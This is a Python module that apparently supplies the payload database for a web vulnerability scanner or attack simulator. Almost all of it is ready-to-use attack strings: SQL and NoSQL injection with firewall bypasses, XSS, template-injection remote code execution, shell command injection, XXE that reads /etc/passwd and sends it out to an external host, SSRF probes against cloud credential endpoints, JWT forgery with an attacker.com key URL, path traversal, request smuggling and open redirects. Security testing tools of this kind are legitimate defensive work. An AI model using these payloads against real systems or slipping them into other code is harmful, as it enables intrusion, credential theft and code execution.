"""
Structured payload database for attack simulation.

Payloads are organized by vulnerability category with context-aware
selection.  Referenced from:
  - dmass attack-playbooks (jwt-patterns, nosql-patterns, cmdi-patterns,
    mass-assign-patterns)
  - SQLMap tamper scripts & test payloads
  - Dalfox XSS context-aware payloads
  - Nuclei template payloads
  - Burp Suite Pro active scan payloads
  - OWASP Testing Guide v4 payloads
  - PortSwigger Web Security Academy payloads
"""

from __future__ import annotations

from dataclasses import dataclass, field


@dataclass
class Payload:
    name: str
    value: str
    context: str = ""
    technique: str = ""
    safe: bool = True


# ---------------------------------------------------------------------------
# SQL Injection Payloads (SQLMap + PortSwigger)
# ---------------------------------------------------------------------------

SQLI_ERROR_BASED: list[Payload] = [
    Payload("single_quote", "'", technique="error-based"),
    Payload("double_quote", '"', technique="error-based"),
    Payload("or_true", "' OR '1'='1'-- -", technique="error-based"),
    Payload("or_true_numeric", "1 OR 1=1-- -", technique="error-based"),
    Payload("and_false", "' AND '1'='2'-- -", technique="error-based"),
    Payload("comment_close", "')-- -", technique="error-based"),
    Payload("parenthesis", "')) OR (('1'='1", technique="error-based"),
    Payload("backslash", "\\", technique="error-based"),
    Payload("null_byte", "%00'", technique="error-based"),
]

SQLI_BOOLEAN_BASED: list[Payload] = [
    Payload("bool_true", "' OR '1'='1'-- -", technique="boolean-blind"),
    Payload("bool_false", "' OR '1'='2'-- -", technique="boolean-blind"),
    Payload("bool_and_true", "' AND '1'='1'-- -", technique="boolean-blind"),
    Payload("bool_and_false", "' AND '1'='2'-- -", technique="boolean-blind"),
    Payload("bool_numeric_true", "1 AND 1=1", technique="boolean-blind"),
    Payload("bool_numeric_false", "1 AND 1=2", technique="boolean-blind"),
]

SQLI_TIME_BASED: dict[str, list[Payload]] = {
    "MySQL": [
        Payload("mysql_sleep", "' OR SLEEP(5)-- -", technique="time-blind"),
        Payload("mysql_benchmark", "' OR BENCHMARK(10000000,SHA1('test'))-- -", technique="time-blind"),
        Payload("mysql_if_sleep", "' OR IF(1=1,SLEEP(5),0)-- -", technique="time-blind"),
    ],
    "PostgreSQL": [
        Payload("pg_sleep", "'; SELECT PG_SLEEP(5)-- -", technique="time-blind"),
        Payload("pg_sleep_inline", "' OR (SELECT PG_SLEEP(5))::text='1'-- -", technique="time-blind"),
    ],
    "MSSQL": [
        Payload("mssql_waitfor", "'; WAITFOR DELAY '0:0:5'-- -", technique="time-blind"),
        Payload("mssql_if_waitfor", "'; IF(1=1) WAITFOR DELAY '0:0:5'-- -", technique="time-blind"),
    ],
    "Oracle": [
        Payload("oracle_sleep", "' OR DBMS_LOCK.SLEEP(5)-- -", technique="time-blind"),
        Payload("oracle_pipe", "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", technique="time-blind"),
    ],
    "SQLite": [
        Payload("sqlite_like", "' OR LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -", technique="time-blind"),
    ],
}

SQLI_UNION: list[Payload] = [
    Payload("union_null_1", "' UNION SELECT NULL-- -", technique="union"),
    Payload("union_null_2", "' UNION SELECT NULL,NULL-- -", technique="union"),
    Payload("union_null_3", "' UNION SELECT NULL,NULL,NULL-- -", technique="union"),
    Payload("union_null_5", "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -", technique="union"),
    Payload("union_version_mysql", "' UNION SELECT @@version,NULL-- -", technique="union"),
    Payload("union_version_pg", "' UNION SELECT version(),NULL-- -", technique="union"),
    Payload("union_table_enum", "' UNION SELECT table_name,NULL FROM information_schema.tables-- -", technique="union"),
]

SQLI_WAF_BYPASS: list[Payload] = [
    Payload("inline_comment", "/*!50000UNION*/+/*!50000SELECT*/+1,2,3-- -", technique="waf-bypass"),
    Payload("case_variation", "uNiOn SeLeCt 1,2,3-- -", technique="waf-bypass"),
    Payload("double_url_encode", "%2527%2520OR%25201%253D1--", technique="waf-bypass"),
    Payload("hex_encoding", "' OR 0x31=0x31-- -", technique="waf-bypass"),
    Payload("whitespace_alt", "'%09OR%091=1--%09-", technique="waf-bypass"),
    Payload("null_byte_bypass", "%00' OR '1'='1'-- -", technique="waf-bypass"),
    Payload("scientific_notation", "' OR 1e0=1e0-- -", technique="waf-bypass"),
    Payload("concat_bypass", "' OR CONCAT('1','')='1'-- -", technique="waf-bypass"),
]

# ---------------------------------------------------------------------------
# NoSQL Injection Payloads (dmass + MongoDB documentation)
# ---------------------------------------------------------------------------

NOSQL_PAYLOADS: list[Payload] = [
    Payload("gt_bypass", '{"$gt":""}', context="json_body", technique="operator-injection"),
    Payload("ne_bypass", '{"$ne":null}', context="json_body", technique="operator-injection"),
    Payload("regex_all", '{"$regex":".*"}', context="json_body", technique="operator-injection"),
    Payload("where_true", '{"$where":"1==1"}', context="json_body", technique="js-injection"),
    Payload("exists_true", '{"$exists":true}', context="json_body", technique="operator-injection"),
    Payload("in_admin", '{"$in":["admin","root"]}', context="json_body", technique="operator-injection"),
    Payload("or_bypass", '[{"$or":[{"username":"admin"},{"username":{"$gt":""}}]}]', context="json_body", technique="logical-operator"),
    Payload("gt_url", "[$gt]=", context="query_param", technique="operator-injection"),
    Payload("ne_url", "[$ne]=null", context="query_param", technique="operator-injection"),
    Payload("regex_url", "[$regex]=.*", context="query_param", technique="operator-injection"),
]

# ---------------------------------------------------------------------------
# XSS Payloads — Context-Aware (Dalfox + dmass + PortSwigger)
# ---------------------------------------------------------------------------

XSS_BY_CONTEXT: dict[str, list[Payload]] = {
    "html_body": [
        Payload("script_alert", "<script>alert(1)</script>", technique="basic"),
        Payload("img_onerror", '<img src=x onerror=alert(1)>', technique="event-handler"),
        Payload("svg_onload", '<svg onload=alert(1)>', technique="event-handler"),
        Payload("svg_nested", '<svg><svg onload=alert(1)>', technique="nested-tag"),
        Payload("math_xlink", '<math><mtext><table><mglyph><svg><mtext><style><img src onerror=alert(1)>', technique="mathml-bypass"),
        Payload("details_toggle", '<details open ontoggle=alert(1)>', technique="event-handler"),
        Payload("body_onload", '<body onload=alert(1)>', technique="event-handler"),
        Payload("marquee_onstart", '<marquee onstart=alert(1)>', technique="event-handler"),
        Payload("video_src", '<video><source onerror=alert(1)>', technique="event-handler"),
        Payload("iframe_srcdoc", '<iframe srcdoc="<script>alert(1)</script>">', technique="srcdoc"),
    ],
    "html_attribute": [
        Payload("dblquote_event", '" onmouseover="alert(1)', technique="attr-escape"),
        Payload("singlequote_event", "' onfocus='alert(1)' autofocus='", technique="attr-escape"),
        Payload("backtick_event", '` onfocus=alert(1) autofocus=`', technique="attr-escape"),
        Payload("style_attr", '" style="animation-name:x" onanimationstart="alert(1)', technique="css-trigger"),
        Payload("tabindex_focus", '" tabindex=1 onfocus="alert(1)" autofocus="', technique="autofocus"),
    ],
    "script_block": [
        Payload("string_break_single", "';alert(1)//", technique="string-escape"),
        Payload("string_break_double", '";alert(1)//', technique="string-escape"),
        Payload("template_literal", "${alert(1)}", technique="template-literal"),
        Payload("close_script", "</script><script>alert(1)</script>", technique="tag-break"),
        Payload("line_break", "\\n;alert(1)//", technique="line-terminator"),
    ],
    "url": [
        Payload("javascript_proto", "javascript:alert(1)", technique="protocol"),
        Payload("data_uri", "data:text/html,<script>alert(1)</script>", technique="data-uri"),
        Payload("javascript_entity", "&#106;avascript:alert(1)", technique="html-entity"),
        Payload("javascript_tab", "java\tscript:alert(1)", technique="whitespace"),
    ],
    "json_body": [
        Payload("json_html_break", '</script><script>alert(1)</script>', technique="tag-break"),
        Payload("json_img", '"><img src=x onerror=alert(1)>', technique="context-break"),
    ],
}

# ---------------------------------------------------------------------------
# SSTI Payloads — Engine-Specific (dmass ssti-detector)
# ---------------------------------------------------------------------------

SSTI_PROBES: list[Payload] = [
    Payload("math_jinja2", "{{7*7}}", context="Jinja2/Twig", technique="detection"),
    Payload("math_twig", "{{7*'7'}}", context="Twig", technique="detection"),
    Payload("math_freemarker", "${7*7}", context="Freemarker", technique="detection"),
    Payload("math_spring_el", "#{7*7}", context="Spring EL", technique="detection"),
    Payload("math_erb", "<%= 7*7 %>", context="ERB", technique="detection"),
    Payload("math_velocity", "#set($x=7*7)${x}", context="Velocity", technique="detection"),
    Payload("math_mako", "${7*7}", context="Mako", technique="detection"),
    Payload("math_pebble", "{% set x = 7*7 %}{{x}}", context="Pebble", technique="detection"),
]

SSTI_RCE: dict[str, list[Payload]] = {
    "Jinja2": [
        Payload("jinja2_popen", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", technique="rce", safe=False),
        Payload("jinja2_mro", "{{''.__class__.__mro__[2].__subclasses__()}}", technique="class-enum", safe=True),
        Payload("jinja2_lipsum", "{{lipsum.__globals__.os.popen('id').read()}}", technique="rce", safe=False),
        Payload("jinja2_cycler", "{{cycler.__init__.__globals__.os.popen('id').read()}}", technique="rce", safe=False),
    ],
    "Freemarker": [
        Payload("freemarker_exec", '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', technique="rce", safe=False),
        Payload("freemarker_new", '<#assign classloader=object?api.class.protectionDomain.classLoader>', technique="class-access", safe=True),
    ],
    "Velocity": [
        Payload("velocity_exec", '#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))', technique="rce", safe=False),
    ],
    "Spring EL": [
        Payload("spring_runtime", "#{T(java.lang.Runtime).getRuntime().exec('id')}", technique="rce", safe=False),
        Payload("spring_processbuilder", '#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").inputStream).useDelimiter("\\\\A").next()}', technique="rce", safe=False),
    ],
    "ERB": [
        Payload("erb_exec", "<%= system('id') %>", technique="rce", safe=False),
        Payload("erb_backtick", "<%= `id` %>", technique="rce", safe=False),
    ],
}

# ---------------------------------------------------------------------------
# Command Injection Payloads (dmass cmdi-patterns)
# ---------------------------------------------------------------------------

CMDI_PAYLOADS: list[Payload] = [
    Payload("semicolon_id", "; id", technique="inline"),
    Payload("pipe_id", "| id", technique="inline"),
    Payload("backtick_id", "`id`", technique="inline"),
    Payload("dollar_id", "$(id)", technique="inline"),
    Payload("and_id", "&& id", technique="inline"),
    Payload("or_id", "|| id", technique="inline"),
    Payload("newline_id", "%0aid", technique="inline"),
    Payload("semicolon_sleep", "; sleep 5", technique="time-blind"),
    Payload("pipe_sleep", "| sleep 5", technique="time-blind"),
    Payload("dollar_sleep", "$(sleep 5)", technique="time-blind"),
    Payload("backtick_sleep", "`sleep 5`", technique="time-blind"),
    Payload("semicolon_ping", "; ping -c 3 127.0.0.1", technique="time-blind"),
    Payload("semicolon_echo", "; echo DMASS_CMDI_MARKER_12345", technique="marker"),
    Payload("dollar_echo", "$(echo DMASS_CMDI_MARKER_12345)", technique="marker"),
]

CMDI_OOB_TEMPLATES: list[Payload] = [
    Payload("nslookup", "; nslookup {oob_domain}", technique="oob", safe=True),
    Payload("curl", "; curl http://{oob_domain}/", technique="oob", safe=True),
    Payload("wget", "; wget http://{oob_domain}/", technique="oob", safe=True),
]

# ---------------------------------------------------------------------------
# XXE Payloads (dmass xxe-detector + PortSwigger)
# ---------------------------------------------------------------------------

XXE_PAYLOADS: list[Payload] = [
    Payload(
        "classic_etc_passwd",
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
        technique="inline",
    ),
    Payload(
        "classic_win_ini",
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><test>&xxe;</test>',
        technique="inline",
    ),
    Payload(
        "oob_dtd",
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://{oob_domain}/evil.dtd"> %xxe;]><test>probe</test>',
        technique="oob",
    ),
    Payload(
        "parameter_entity",
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % data SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://{oob_domain}/?d=%data;\'>">%eval;%exfil;]><test>1</test>',
        technique="oob-exfiltration",
    ),
    Payload(
        "xinclude",
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
        technique="xinclude",
    ),
    Payload(
        "svg_xxe",
        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>',
        technique="svg",
    ),
]

# ---------------------------------------------------------------------------
# SSRF Payloads (dmass cloud-metadata-prober + PortSwigger)
# ---------------------------------------------------------------------------

SSRF_PAYLOADS: list[Payload] = [
    Payload("aws_imdsv1", "http://169.254.169.254/latest/meta-data/", context="aws", technique="cloud-metadata"),
    Payload("aws_imdsv1_role", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", context="aws", technique="cloud-metadata"),
    Payload("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", context="gcp", technique="cloud-metadata"),
    Payload("azure_metadata", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", context="azure", technique="cloud-metadata"),
    Payload("ecs_creds", "http://169.254.170.2/v2/credentials/", context="ecs", technique="cloud-metadata"),
    Payload("localhost", "http://127.0.0.1/", context="internal", technique="port-scan"),
    Payload("localhost_admin", "http://127.0.0.1/admin", context="internal", technique="admin-access"),
    Payload("internal_10", "http://10.0.0.1/", context="internal", technique="network-scan"),
    Payload("decimal_ip", "http://2130706433/", context="bypass", technique="ip-obfuscation"),
    Payload("ipv6_localhost", "http://[::1]/", context="bypass", technique="ipv6"),
    Payload("dns_rebinding", "http://localtest.me/", context="bypass", technique="dns-rebinding"),
    Payload("redirect_bypass", "http://external.com/redirect?url=http://169.254.169.254/", context="bypass", technique="redirect-chain"),
]

# ---------------------------------------------------------------------------
# JWT Attack Payloads (dmass jwt-auditor)
# ---------------------------------------------------------------------------

JWT_ATTACKS: dict[str, dict] = {
    "alg_none": {
        "description": "Set algorithm to 'none' to bypass signature verification",
        "header_override": {"alg": "none", "typ": "JWT"},
        "strip_signature": True,
        "technique": "algorithm-confusion",
    },
    "alg_none_variants": {
        "description": "Try case variations of none algorithm",
        "variants": ["none", "None", "NONE", "nOnE"],
        "technique": "algorithm-confusion",
    },
    "rs256_to_hs256": {
        "description": "Key confusion: sign RS256 token with public key as HS256 secret",
        "header_override": {"alg": "HS256"},
        "technique": "key-confusion",
    },
    "kid_traversal": {
        "description": "kid header path traversal to use predictable key file",
        "header_override": {"kid": "../../dev/null"},
        "technique": "kid-injection",
    },
    "kid_sqli": {
        "description": "kid header SQL injection to manipulate key lookup",
        "header_override": {"kid": "' UNION SELECT 'secret' -- "},
        "technique": "kid-injection",
    },
    "exp_manipulation": {
        "description": "Set exp claim far in the future",
        "payload_override": {"exp": 9999999999},
        "technique": "claim-manipulation",
    },
    "jku_injection": {
        "description": "Override JKU to point to attacker-controlled JWKS",
        "header_override": {"jku": "https://attacker.com/.well-known/jwks.json"},
        "technique": "jku-injection",
    },
}

# ---------------------------------------------------------------------------
# Mass Assignment Payloads (dmass mass-assign-patterns)
# ---------------------------------------------------------------------------

MASS_ASSIGNMENT_FIELDS: list[dict] = [
    {"field": "role", "value": "admin", "type": "string"},
    {"field": "isAdmin", "value": True, "type": "boolean"},
    {"field": "is_admin", "value": True, "type": "boolean"},
    {"field": "admin", "value": True, "type": "boolean"},
    {"field": "user_level", "value": 99, "type": "integer"},
    {"field": "permission", "value": "admin", "type": "string"},
    {"field": "permissions", "value": ["admin", "superuser", "owner"], "type": "array"},
    {"field": "credits", "value": 999999, "type": "integer"},
    {"field": "balance", "value": 999999.99, "type": "float"},
    {"field": "verified", "value": True, "type": "boolean"},
    {"field": "email_verified", "value": True, "type": "boolean"},
    {"field": "active", "value": True, "type": "boolean"},
    {"field": "account_type", "value": "admin", "type": "string"},
    {"field": "subscription_level", "value": "enterprise", "type": "string"},
    {"field": "groups", "value": ["admin", "owner"], "type": "array"},
    {"field": "scopes", "value": ["read", "write", "admin", "delete"], "type": "array"},
]

# ---------------------------------------------------------------------------
# Path Traversal Payloads (dmass + Nuclei)
# ---------------------------------------------------------------------------

PATH_TRAVERSAL_PAYLOADS: list[Payload] = [
    Payload("basic_unix", "../../../../etc/passwd", technique="basic"),
    Payload("basic_windows", "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", technique="basic"),
    Payload("url_encoded", "..%2F..%2F..%2F..%2Fetc%2Fpasswd", technique="url-encode"),
    Payload("double_url_encoded", "..%252F..%252F..%252F..%252Fetc%252Fpasswd", technique="double-encode"),
    Payload("unicode_encoded", "..%C0%AF..%C0%AF..%C0%AFetc%C0%AFpasswd", technique="unicode"),
    Payload("null_byte", "../../../../etc/passwd%00.jpg", technique="null-byte"),
    Payload("dot_truncation", "../../../../etc/passwd...................................................", technique="dot-truncation"),
    Payload("proc_self", "/proc/self/environ", technique="proc"),
    Payload("absolute_path", "/etc/passwd", technique="absolute"),
]

# ---------------------------------------------------------------------------
# HTTP Smuggling Payloads (dmass smuggling-detector + PortSwigger)
# ---------------------------------------------------------------------------

HTTP_SMUGGLING_TEMPLATES: dict[str, dict] = {
    "CL.TE": {
        "description": "Front-end uses Content-Length, back-end uses Transfer-Encoding",
        "headers": {
            "Content-Length": "6",
            "Transfer-Encoding": "chunked",
        },
        "body": "0\r\n\r\nG",
        "technique": "CL.TE",
    },
    "TE.CL": {
        "description": "Front-end uses Transfer-Encoding, back-end uses Content-Length",
        "headers": {
            "Content-Length": "3",
            "Transfer-Encoding": "chunked",
        },
        "body": "8\r\nSMUGGLED\r\n0\r\n\r\n",
        "technique": "TE.CL",
    },
    "TE.TE": {
        "description": "Both use Transfer-Encoding but disagree on obfuscated value",
        "headers": {
            "Transfer-Encoding": "chunked",
            "Transfer-encoding": "x",
        },
        "body": "0\r\n\r\n",
        "technique": "TE.TE",
    },
}

# ---------------------------------------------------------------------------
# Open Redirect Payloads (OWASP + Burp)
# ---------------------------------------------------------------------------

OPEN_REDIRECT_PAYLOADS: list[Payload] = [
    Payload("double_slash", "//evil.com", technique="protocol-relative"),
    Payload("backslash", "\\\\evil.com", technique="backslash"),
    Payload("at_sign", "http://target.com@evil.com", technique="credential-bypass"),
    Payload("encoded_slash", "/\\/evil.com", technique="encoded"),
    Payload("null_prefix", "%00//evil.com", technique="null-byte"),
    Payload("tab_newline", "//evil%E3%80%82com", technique="unicode-fullstop"),
    Payload("data_uri", "data:text/html,<script>alert(1)</script>", technique="data-uri"),
    Payload("domain_suffix", "https://evil.com.target.com", technique="subdomain"),
]


# ---------------------------------------------------------------------------
# Selection helpers
# ---------------------------------------------------------------------------

def get_payloads_for_vuln_type(vuln_type: str) -> list[Payload]:
    vt = vuln_type.lower()

    if "sql" in vt and "nosql" not in vt:
        return SQLI_ERROR_BASED + SQLI_BOOLEAN_BASED + SQLI_UNION + SQLI_WAF_BYPASS
    if "nosql" in vt:
        return NOSQL_PAYLOADS
    if "xss" in vt or "cross-site scripting" in vt:
        all_xss: list[Payload] = []
        for payloads in XSS_BY_CONTEXT.values():
            all_xss.extend(payloads)
        return all_xss
    if "ssti" in vt or "template" in vt:
        return SSTI_PROBES
    if "command" in vt or "cmdi" in vt or "os injection" in vt:
        return CMDI_PAYLOADS
    if "xxe" in vt or "xml external" in vt:
        return XXE_PAYLOADS
    if "ssrf" in vt or "server-side request" in vt:
        return SSRF_PAYLOADS
    if "path traversal" in vt or "directory traversal" in vt or "lfi" in vt:
        return PATH_TRAVERSAL_PAYLOADS
    if "mass assignment" in vt:
        return [Payload(f["field"], str(f["value"]), technique="field-injection") for f in MASS_ASSIGNMENT_FIELDS]
    if "redirect" in vt:
        return OPEN_REDIRECT_PAYLOADS
    if "smuggling" in vt:
        return [Payload(k, v["body"], technique=v["technique"]) for k, v in HTTP_SMUGGLING_TEMPLATES.items()]

    return []


def get_xss_payloads_for_context(context: str) -> list[Payload]:
    return XSS_BY_CONTEXT.get(context, XSS_BY_CONTEXT["html_body"])


def get_sqli_time_payloads(dbms: str = "") -> list[Payload]:
    if dbms and dbms in SQLI_TIME_BASED:
        return SQLI_TIME_BASED[dbms]
    all_time: list[Payload] = []
    for payloads in SQLI_TIME_BASED.values():
        all_time.extend(payloads)
    return all_time
